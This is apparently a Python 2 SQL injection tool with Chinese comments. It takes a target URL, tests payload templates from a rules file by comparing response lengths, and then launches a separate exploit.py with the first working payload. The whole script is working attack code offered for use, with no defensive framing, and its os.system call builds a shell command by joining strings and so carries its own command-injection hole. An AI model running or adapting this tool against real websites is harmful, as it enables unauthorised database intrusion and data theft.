#!/usr/bin/env python
# encoding:utf8

import requests
import sys
import os

if len(sys.argv) != 2:
    print "Usage : " + "python " + sys.argv[0] + " [URL]"
    print "Example : python " + sys.argv[0] + " http://www.xxx.com/index.php?id=1"
    exit(1)

url = sys.argv[1]
baseUrl = url.split("=")[0] + "="
# 截取用户输入URL中的参数的值
currentQuery = url.split("=")[1] # 正确的查询参数
print "----------------------"
print "Checking : " + url
print "----------------------"
counter = 0
payloads = []
rules = open('rules', 'r')
wrongQuery = "0" # 正确的查询参数 # TODO 这里是否也需要作为参数提取出来
url = baseUrl + currentQuery
contentLength = len(requests.get(url).text)
for line in rules:
    if line.startswith("#"):
        continue
    if line == "\r\n":
        continue
    line = line.replace("\r","")
    line = line.replace("\n","")
    startTemp = line.split("()")[0]
    endTemp = line.split("()")[1]
    payload1 = startTemp + "(" + wrongQuery + ")" + endTemp
    testUrl1 = baseUrl + payload1
    payload2 = startTemp + "(" + currentQuery + ")" + endTemp
    testUrl2 = baseUrl + payload2
    content1 = requests.get(testUrl1).text
    content1 = content1.replace(payload1,wrongQuery)
    len1 = len(content1)
    content2 = requests.get(testUrl2).text
    content2 = content2.replace(payload2,currentQuery)
    len2 = len(content2)
    if (len1 != contentLength) and (len2 == contentLength):
        payloads.append(line)
        counter += 1
        print baseUrl + line
print "----------------------"
print counter," valunable found!"
print "----------------------"
if counter != 0:
    print "Start Hacking..."
    # 添加转义
    hack_payload = payloads[0]
    hack_payload = hack_payload.replace("\"","\\\"")
    command = "python exploit.py \"" + hack_payload + "\" \"" + baseUrl + "\" \"" + currentQuery + "\""
    print "Exce : " + command
    os.system(command)
